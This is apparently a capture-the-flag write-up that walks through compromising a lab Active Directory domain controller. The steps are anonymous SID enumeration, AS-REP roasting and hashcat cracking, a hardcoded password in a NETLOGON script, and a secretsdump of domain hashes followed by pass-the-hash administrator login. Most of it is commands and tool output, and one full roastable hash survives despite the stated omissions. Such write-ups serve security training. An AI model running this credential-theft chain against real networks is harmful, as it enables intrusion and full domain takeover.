## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
VulnNet Entertainment quickly deployed another management instance on their very broad network...
VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.  
- Difficulty: Easy
- Operating System: Windows  
This is a much simpler machine, do not overthink. You can do it by following common methodologies.
Note: It _might_ take up to 6 minutes for this machine to fully boot.
```
#### IP-Address
```IP-Address
10.49.158.18
```
### Enumeration
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-12 04:57:32Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49809/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
---
##### Enumeration
- `SMB`
```bash
$ nxc smb 10.48.186.86
SMB         10.48.186.86    445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:None) (Null Auth:True)
```
- More
```bash
$ smbclient -L //10.48.186.86 -N
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.186.86 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

$ impacket-lookupsid anonymous@10.48.186.86
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Brute forcing SIDs at 10.48.186.86
[*] StringBinding ncacn_np:10.48.186.86[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```
- Got Multiple Username 
```user.txt
jack  
jack.goldenhand  
jgoldenhand  
alexa  
alexa.whitehat  
awhitehat  
tony  
tony.skid  
tskid  
johnny  
johnny.leet  
jleet
```
- SMB-verbose
```bash
$ cat > validusers.txt << EOF
administrator
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
EOF

$ impacket-GetNPUsers vulnnet-rst.local/ \
-no-pass \
-usersfile validusers.txt \
-dc-ip 10.48.186.86
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:e59a4d3b7a953912aedf4c852f748c33$2198cfb900f04a5b2ac3b237c54c1c16aeb5fa7438279a039f091f3bdaa4a6a9e9e443198cc6f0a1a0ad5eb250913b866ee0ecaffb3e554037b10410e765adbc5454000376abdb4ee7002f35c39693e9a0e7d96b5245f87771f058636a45a660befe39a59909ea1c2b810a31412714cc36e60b9e73062370edb47adbc3f25cb704293ae487ede9c2b3231939d35d5874603e0590e4f1789a0d045f1e52a89482624ed6f6eb18adb3743224d6d5c4ee7a3e4ed75ad49a62c462e69c14c75d5a026197ab580fcd002e88899c5d1840402d6f25f4b63d60192262d62152ebdbbb014290acd8c5d752b6b9c7667f75ad719e2e0b7b9a1ced
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn''t have UF_DONT_REQUIRE_PREAUTH set
```
- Password cracking
```bash
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 9 9900X 12-Core Processor, 2210/4420 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (3415 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921513
* Keyspace..: 14344386

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:[hash omitted]:[password omitted]*

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:[hash omitted]
Time.Started.....: Tue May 12 02:50:45 2026 (2 secs)
Time.Estimated...: Tue May 12 02:50:47 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2243.1 kH/s (1.07ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3178496/14344386 (22.16%)
Rejected.........: 0/3178496 (0.00%)
Restore.Point....: 3174400/14344386 (22.13%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: tk0848691041 -> tj0307
Hardware.Mon.#01.: Util: 66%

Started: Tue May 12 02:50:39 2026
Stopped: Tue May 12 02:50:48 2026

$ hashcat hash.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:[hash omitted]:[password omitted]*
```
- `SMB` Login as User `t-skid`
```bash
smbclient -U t-skid //10.48.143.241/NETLOGON
Password for [WORKGROUP\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 19:15:49 2021
  ..                                  D        0  Tue Mar 16 19:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 19:18:14 2021

		8771839 blocks of size 4096. 4505735 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (5.4 KiloBytes/sec) (average 5.4 KiloBytes/sec)
smb: \>


$ cat ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "[password omitted]"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName 
```
- Got the Creds for the new User ``
```Creds
strUserNTName = "a-whitehat"
strPassword = "[password omitted]"
```
- Login Using `Evil-WInrm`
```bash
$ evil-winrm -i 10.48.143.241 -u a-whitehat -p '[password omitted]'
*Evil-WinRM* PS C:\Users\enterprise-core-vn> dir
Directory: C:\Users\enterprise-core-vn

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/13/2021   3:43 PM                Desktop
d-r---        3/13/2021   3:42 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir
Directory: C:\Users\enterprise-core-vn\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> get user.txt
The term 'get' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ get user.txt
+ ~~~
    + CategoryInfo          : ObjectNotFound: (get:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
[flag omitted]
```
----
##### Privilege Escalation
```bash
─$ impacket-secretsdump vulnnet-rst.local/a-whitehat:[password omitted]@10.48.143.241
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: [key omitted]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:[lmhash omitted]:[nthash omitted]:::
Guest:501:[lmhash omitted]:[nthash omitted]:::
DefaultAccount:503:[lmhash omitted]:[nthash omitted]:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:[key omitted]
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:[key omitted]
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:[key omitted]
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:[hex blob omitted]
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:d71d3844d39d2991d4cda9655c1c64bc:::
[*] DPAPI_SYSTEM
dpapi_machinekey:[key omitted]
dpapi_userkey:[key omitted]
[*] NL$KM
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:[key omitted]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[lmhash omitted]:[nthash omitted]:::
Guest:501:[lmhash omitted]:[nthash omitted]:::
krbtgt:502:[lmhash omitted]:[nthash omitted]:::
vulnnet-rst.local\enterprise-core-vn:1104:[lmhash omitted]:[nthash omitted]:::
vulnnet-rst.local\a-whitehat:1105:[lmhash omitted]:[nthash omitted]:::
vulnnet-rst.local\t-skid:1109:[lmhash omitted]:[nthash omitted]:::
vulnnet-rst.local\j-goldenhand:1110:[lmhash omitted]:[nthash omitted]:::
vulnnet-rst.local\j-leet:1111:[lmhash omitted]:[nthash omitted]:::
WIN-2BO8M1OE1M1$:1000:[lmhash omitted]:[nthash omitted]:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:[key omitted]
Administrator:aes128-cts-hmac-sha1-96:[key omitted]
Administrator:des-cbc-md5:[key omitted]
krbtgt:aes256-cts-hmac-sha1-96:[key omitted]
krbtgt:aes128-cts-hmac-sha1-96:[key omitted]
krbtgt:des-cbc-md5:[key omitted]
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:[key omitted]
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\a-whitehat:des-cbc-md5:[key omitted]
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\t-skid:des-cbc-md5:[key omitted]
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\j-goldenhand:des-cbc-md5:[key omitted]
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:[key omitted]
vulnnet-rst.local\j-leet:des-cbc-md5:[key omitted]
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:[key omitted]
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:[key omitted]
WIN-2BO8M1OE1M1$:des-cbc-md5:[key omitted]
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7f0a84e30ea0>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 172, in __del__
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 169, in close
  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 409, in close
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7f0a84e30ea0>
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 172, in __del__
  File "/usr/lib/python3/dist-packages/impacket/winregistry.py", line 169, in close
  File "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py", line 409, in close
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1357, in close
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 474, in sendSMB
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 443, in signSMB
  File "/usr/lib/python3/dist-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'

```
- Got the `Administrator` hash
```bash
$ evil-winrm -i 10.48.143.241 -u Administrator -H [nthash omitted]

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
[flag omitted]
```

# END